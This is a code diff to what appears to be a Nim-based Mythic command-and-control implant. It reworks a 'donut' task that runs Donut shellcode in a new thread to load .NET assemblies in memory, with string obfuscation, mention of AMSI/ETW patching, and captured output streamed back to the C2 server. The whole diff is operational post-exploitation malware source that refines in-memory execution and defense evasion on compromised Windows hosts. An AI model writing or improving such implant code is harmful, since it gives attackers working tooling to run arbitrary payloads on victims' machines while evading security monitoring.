@@ -1,7 +1,6 @@
 import ../utils/m_responses
 import ../utils/debug
 import ../utils/strenc
-import ../global_data
 import std/[json, base64, strformat, times]
 
 when defined(windows):
@@ -27,20 +26,7 @@ proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string,
 proc donut*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
-      # Check if using cached file first (no uuid needed)
-      if params.hasKey(obf("cached")):
-        let cachedName = params[obf("cached")].getStr()
-        let cachedData = getCachedFile(cachedName)
-        if cachedData.len == 0:
-          return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
-        # Build params with dummy uuid for downstream parsing
-        var cachedParams = copy(params)
-        if not cachedParams.hasKey(obf("uuid")):
-          cachedParams[obf("uuid")] = %""
-        var fileData = cachedData
-        return processDonutChunk(taskId, cachedParams, "", 1, 1, fileData)
-      
-      # Non-cached: parse full args (uuid required)
+      # Parse full args (uuid required)
       let args = to(params, DonutArgs)
       
       debug &"[DEBUG] Donut execution: {args.assembly_name}"
@@ -115,6 +101,8 @@ when defined(windows):
       capturedStderr: string
       patchOutput: string  # AMSI/ETW patch messages
       deadline: float  # epochTime deadline
+      gotOutput: bool  # Whether any output has been received
+      lastOutputTime: float  # epochTime of last output received
 
   var donutExecState: DonutExecState
 
@@ -141,11 +129,9 @@ when defined(windows):
         break
 
   proc cleanupDonutExec(state: var DonutExecState) =
-    ## Clean up all handles and restore stdout/stderr
+    ## Clean up all handles
     CloseHandle(state.stdoutWrite)
     CloseHandle(state.stderrWrite)
-    SetStdHandle(STD_OUTPUT_HANDLE, state.originalStdout)
-    SetStdHandle(STD_ERROR_HANDLE, state.originalStderr)
     # Final drain after closing write ends
     drainPipes(state)
     CloseHandle(state.stdoutRead)
@@ -160,21 +146,40 @@ proc checkDonutExecution*(taskId: string): JsonNode =
     if not donutExecState.active:
       return nil
     
-    # Drain pipes to prevent write blocking
+    # Drain pipes and track whether new output arrived
+    let prevLen = donutExecState.capturedOutput.len + donutExecState.capturedStderr.len
     drainPipes(donutExecState)
+    let newLen = donutExecState.capturedOutput.len + donutExecState.capturedStderr.len
+    
+    if newLen > prevLen:
+      donutExecState.gotOutput = true
+      donutExecState.lastOutputTime = epochTime()
     
     # Check if thread finished (0ms wait = non-blocking check)
     let waitResult = WaitForSingleObject(donutExecState.hThread, 0)
     
     if waitResult == WAIT_OBJECT_0:
-      # Thread completed
+      # Thread completed — send any remaining output as final response
       var output = donutExecState.patchOutput
       output.add(obf("[+] Donut shellcode executed successfully for ") & donutExecState.assemblyName & obf("\n"))
       cleanupDonutExec(donutExecState)
       if donutExecState.capturedOutput.len > 0:
-        output.add(obf("\n--- stdout ---\n") & donutExecState.capturedOutput)
+        output.add(donutExecState.capturedOutput)
       if donutExecState.capturedStderr.len > 0:
-        output.add(obf("\n--- stderr ---\n") & donutExecState.capturedStderr)
+        output.add(donutExecState.capturedStderr)
+      return mythicSuccess(taskId, output)
+    
+    # If we got output but nothing new for 10s, assembly is done
+    # (with exit_opt=3, the CLR thread stays alive but Main() has returned)
+    if donutExecState.gotOutput and (epochTime() - donutExecState.lastOutputTime) >= 10.0:
+      discard TerminateThread(donutExecState.hThread, 0)
+      var output = donutExecState.patchOutput
+      output.add(obf("[+] Donut shellcode executed successfully for ") & donutExecState.assemblyName & obf("\n"))
+      cleanupDonutExec(donutExecState)
+      if donutExecState.capturedOutput.len > 0:
+        output.add(donutExecState.capturedOutput)
+      if donutExecState.capturedStderr.len > 0:
+        output.add(donutExecState.capturedStderr)
       return mythicSuccess(taskId, output)
     
     # Check timeout
@@ -184,10 +189,21 @@ proc checkDonutExecution*(taskId: string): JsonNode =
       output.add(obf("[!] Donut shellcode execution timed out\n"))
       cleanupDonutExec(donutExecState)
       if donutExecState.capturedOutput.len > 0:
-        output.add(obf("\n--- stdout ---\n") & donutExecState.capturedOutput)
+        output.add(donutExecState.capturedOutput)
       if donutExecState.capturedStderr.len > 0:
-        output.add(obf("\n--- stderr ---\n") & donutExecState.capturedStderr)
+        output.add(donutExecState.capturedStderr)
       return mythicSuccess(taskId, output)
+    
+    # Stream intermediate output to Mythic as it arrives
+    if donutExecState.capturedOutput.len > 0 or donutExecState.capturedStderr.len > 0:
+      var intermediate = ""
+      if donutExecState.capturedOutput.len > 0:
+        intermediate.add(donutExecState.capturedOutput)
+        donutExecState.capturedOutput = ""
+      if donutExecState.capturedStderr.len > 0:
+        intermediate.add(donutExecState.capturedStderr)
+        donutExecState.capturedStderr = ""
+      return mythicProcessing(taskId, intermediate)
     
     # Still running, nothing to report yet
     return nil
@@ -304,6 +320,13 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
         discard VirtualFree(pShellcode, 0, MEM_RELEASE)
         return mythicError(taskId, obf("CreateThread failed: ") & $err)
       
+      # Give the CLR a moment to cache the redirected console handles,
+      # then restore process-wide handles so other threads (debug, agent
+      # main loop) don't write into our pipes.
+      Sleep(100)
+      SetStdHandle(STD_OUTPUT_HANDLE, originalStdout)
+      SetStdHandle(STD_ERROR_HANDLE, originalStderr)
+
       let timeoutSec = if args.timeout > 0: args.timeout else: 30
       
       # Store state for polling
@@ -323,6 +346,8 @@ proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNo
         capturedStderr: "",
         patchOutput: patchOutput,
         deadline: epochTime() + float(timeoutSec),
+        gotOutput: false,
+        lastOutputTime: 0.0,
       )
       
       debug &"[DEBUG] Donut: Thread launched, returning to main loop (timeout: {timeoutSec}s)"
